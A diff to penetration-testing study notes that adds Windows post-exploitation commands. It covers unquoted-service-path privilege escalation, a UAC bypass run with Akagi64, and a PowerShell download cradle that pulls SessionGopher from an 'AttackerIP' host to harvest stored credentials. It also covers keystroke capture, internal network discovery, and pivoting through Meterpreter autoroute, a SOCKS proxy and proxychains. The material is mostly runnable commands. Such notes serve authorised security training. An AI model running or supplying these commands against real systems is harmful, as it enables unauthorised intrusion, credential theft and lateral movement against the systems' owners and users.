@@ -172,6 +172,19 @@ download https://github.com/hfiref0x/UACME
 drop into shell, run exploit with the bypass UAC tool:
 C:\Users\els\Downloads>Akagi64.exe 10 C:\Users\els\Downloads\exploit.exe 
 // This runs the exploit backdoor with the UAC bypass tool using the option 10 (check usage)
+
+ADDITIONAL TECHNIQUES:
+Exploiting Unquoted Service Paths for Priv Esc. // Start with Meterpreter on Low-Priv User
+c:\> wmic service get name.displayname.pathname.startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """  // Displays unquoted services
+// Check to see if current user can stop/start the unquoted service
+c:\> sc stop ServiceName && sc start ServiceName
+c:\> sc qc ServiceName // check if service will run as system
+// stop the identified service
+// identify if can write to directory of identified service
+c:\ProgramFiles\Directory> icacls "Directory Containing Vulnerable Service"
+// Upload payload exe to writtable directory & start handler with autorun option: 
+> set AutoRunScript migrate -n svchost.exe
+// start the identified service -- should get shell.
 ```
 _1.3.2 Persistence_  
 ```
@@ -191,5 +204,36 @@ _1.3.3 Pillaging_
   enum_applications, /credentials/, credential_collector
 > search -f *.kdb -r -d . // search for all KeePass DB files in current directory of victim machine.
 
+// Upload SessionGopher PowerShell script on victim machine to get stored/remote credentials
+Download to attacker machine https://github.com/fireeye/SessionGopher
+// Serve the PS script on a simple python server
+~/SessionGopher# python -m SimpleHTTPServer 80
+// On Victim machine launch PowerShell download cradle 
+C:\> powershell.exe -nop -ep bypass -C iex <New-Object Net.Webclient>.DownloadString<'http://AttackerIP/SessionGopher.ps1'>; Invoke-SessionGopher -Thorough
+
 > screenshot && keyscan_start && keyscan_dump //screenshot victim machine screen, start keystroke sniffer, dump keystrokes.
+
+Mapping Internal Network
+> arp
+// Drop into Windows shell from meterpreter
+c:\> ipconfig /displaydns
+c:\> ipconfig /all
+c:\> netstat -ano // displays all active connections on victim machine
+// Back in meterpreter
+> use post/multi/gather/ping_sweep // Uses the victim machine to ping sweep ip range. Set session.
+> run arp_scanner -r <TargetCIDR or Range> // performs ARP discovery scan using victim machine
+```
+_1.3.3 Pivoting_
+```
+Configure Pivoting Envrionment
+> use post/windows/manage/autoroute // add target subnet and session id
+> route print // check if all traffic destined to that subnet goes through selected session host
+> use auxiliary/scanner/portscan/tcp // try to scan tcp ports in new subnet
+
+> use auxiliary/server/socks4a && run // start a socks4a proxy server
+// edit proxychains conf file, sudo nano /etc/proxychains.conf ; only need to set last line as socks4 127.0.0.1 1080
+// Once proxychains set, all commands ran should be pivoted through server with prepending proxychains command
+$ proxychains4 ssh root@<HostInNetwork>
+$ proxychains4 firefox // runs web browser through pivot, to access web application in new network.
+// to clear jobs and routing table, jobs -K and route flush
 ```
